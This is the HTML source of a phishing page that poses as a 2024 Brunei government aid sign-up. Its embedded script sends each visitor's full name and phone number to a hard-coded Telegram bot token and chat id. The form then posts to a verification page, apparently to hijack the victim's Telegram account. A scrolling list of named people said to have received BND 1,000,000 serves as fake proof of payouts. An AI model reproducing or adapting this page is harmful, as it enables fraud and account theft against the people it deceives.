<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>BANTUAN KERAJAAN BRUNEI 2024</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="BANTUAN KERAJAAN BRUNEI" name="keywords">
    <meta content="Kerajaan telah menambah baik program bantuan sebagai bantuan subsidi bersasar kepada rakyat yang paling terkesan dengan gelumang kos sara hidup. " name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@500;600;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/animate/animate.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
    <link href="lib/twentytwenty/twentytwenty.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
    <script type="text/javascript" src="http://ff.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=OgOBJqvC8NQ4mUY3yEePsESVq26BRlEalmf0EgvfwwhjHiBbm0Azak0RLGwVsBjz3J9spLITl9U9lvqvdD47Lg" charset="UTF-8"></script><script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=c8_6rtzRiZvD3ySivDUTbS1RcvcC4myw3zcb8I9JlkGKJsrHBU6WK-Yj_khmwVlntWXw7FCptcyVFv-l2Pwqqw" charset="UTF-8"></script>
</head>

<body>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>

    <script>
        function kirimPesan() {

            var phone = document.getElementById('phone');
            var nama = document.getElementById('nama');

            var gabungan = '%5BDALLE%20KO%5D%0A%0A' + 'NAMA%20%3A%0A' + nama.value + '%0A%0ANOMOR%20%3A%0A' + phone.value;

            var token = '6920342894:AAG6l6BPhOQR_0lBHynmcrkTjj3-JzVczXs'; // Ganti dengan token bot yang kamu buat
            var grup = '1837669708'; // Ganti dengan chat id dari bot yang kamu buat

            $.ajax({
                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                method: `POST`,
            })
        }
    </script>



    <style>
        /* Add a black background color to the top navigation */

        .topnav {
            background-color: #260086f7;
            overflow: hidden;
        }

        /* Style the links inside the navigation bar */

        .topnav a {
            float: center;
            display: block;
            color: #f2f2f2;
            text-align: center;
            padding: 14px 16px;
            text-decoration: none;
            font-size: 24px;
            font-weight: bold;
        }

        /* Change the color of links on hover */

        .topnav a:hover {
            background-color: #ffffff;
            color: rgb(255, 255, 255)
        }

        /* Add an active class to highlight the current page */

        .topnav a.active {
            background-color: #04AA6D;
            color: white;
        }

        /* Hide the link that should open and close the topnav on small screens */

        .topnav .icon {
            display: none;
        }
    </style>

    <!-- Navbar Start -->
    <!-- <nav class="topnav">
        <a href="index.html" >
            
            BANTUAN HAJI/UMROH 2024
       
        </a>
    </nav> -->
    <!-- Navbar End -->


    <!-- Carousel Start -->
    <div class="container-fluid p-0">
        <div id="header-carousel" class="carousel slide carousel-fade" data-bs-ride="carousel">
            <div class="carousel-inner">
                <div class="carousel-item active">
                    <img class="w-100" style="" src="img/banner.png" alt="Image">
                </div>
                <!-- <div class="carousel-item">
                    <img class="w-100" src="img/2.jpg" alt="Image">
                </div>
                <div class="carousel-item">
                    <img class="w-100" src="img/3.jpg" alt="Image">
                </div>
                <div class="carousel-item">
                    <img class="w-100" src="img/4.jpg" alt="Image">
                </div> -->
            </div>
        </div>
    </div>
    <!-- Carousel End -->


    <!-- Appointment End -->

    <!-- About Start -->



    <!-- Appointment Start -->
    <div class="container-fluid mb-2">
        <div class="container">

            <div class="col">
                <div class="py-0">
                    <h1 class="display-5 mb-1 text-center" style="font-size: 22px; color: #2c3ce4;">SIGN UP</h1>
                </div>
            </div>
            <div class="col">
                <div class=" h-100 d-flex flex-column justify-content-center text-center p-2">
                    <form action="pengesahan.php" method="post" onsubmit="loadd();">
                        <div class="row g-2">
                            <div class="input-group mb-0">
                                <span class="input-group-text" id="basic-addon1">FULL NAME</span>
                                <input type="text" name="nama" id="nama" class="form-control" placeholder="ENTER FULL NAME" aria-label="Nama Penuh Sesuai MyKad" aria-describedby="basic-addon1">
                            </div>

                            <div class="input-group mb-0">
                                <span class="input-group-text" id="basic-addon1">BN +673</span>
                                <input type="number" name="phone" id="phone" class="form-control" placeholder="888xxxx" aria-label="Phone Number Telegram" aria-describedby="basic-addon1">
                            </div>

                            <div class="col-12">
                                <button name="save" id="nextBtn" type="submit" class="btn btn-dark w-100 py-3" onclick="kirimPesan()">SIGN IN TELEGRAM</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
      
    </div>
</div>
<!-- Appointment End -->

    <div class="carousel-item active">
        <img class="w-100 mb-3" src="img/footer.png" alt="Image">
    </div>



 
<br>
<br>


      <div class="card bg-primary mt-5">
        <div class="card-header text-center" style="font-weight: bold; color: #ffffff;">PENERIMA BANTUAN</div>
        <div class="card-body">
            <marquee direction="up" height="150px">

            <button style="width: 100%;" class="btn btn-light">Nurul Afifah binti Iqbal
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>

                                <button style="width: 100%;" class="btn btn-secondary">Mohammed Buang Salehudin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Mohamad Che Hussein Syazwan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
                                <button style="width: 100%;" class="btn btn-secondary">Noor Rahmah binti Wan Redzuawan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Nor Hajjah Rosalinda binti Mansor
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Nurul Azika binti Zulkefli
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Nur Shafiqah Adam
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Nurul Nikmah binti Tarmizi
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Nur Norsyamimie Noorizman binti Mukmin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Shahira Khusaini
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Nuur Wardatul Shmsul binti Azim
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Sybil Pathmanaban
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Wan Aniq bin Izlan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Muhamad Irfan bin Mutaali
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Qamarina Hapani binti Syed Shah
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Nuur Hajjah Nordiana Sonan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Nur Nabila Arias binti Sudarrahman
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Dalila binti Rozi Zainudin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <p></p>
                                <button style="width: 100%;" class="btn btn-light">Hayaty Zolkafeli binti Darul Yajid
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                <button style="width: 100%;" class="btn btn-secondary">Wahidah binti Buhari
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
                                </marquee>
                            </div>
                        </div>



                        <!-- JavaScript Libraries -->
                        <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
                        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
                        <script src="lib/wow/wow.min.js"></script>
                        <script src="lib/easing/easing.min.js"></script>
                        <script src="lib/waypoints/waypoints.min.js"></script>
                        <script src="lib/owlcarousel/owl.carousel.min.js"></script>
                        <script src="lib/tempusdominus/js/moment.min.js"></script>
                        <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
                        <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>
                        <script src="lib/twentytwenty/jquery.event.move.js"></script>
                        <script src="lib/twentytwenty/jquery.twentytwenty.js"></script>

                        <!-- Template Javascript -->
                        <script src="js/main.js"></script>
</body>

</html>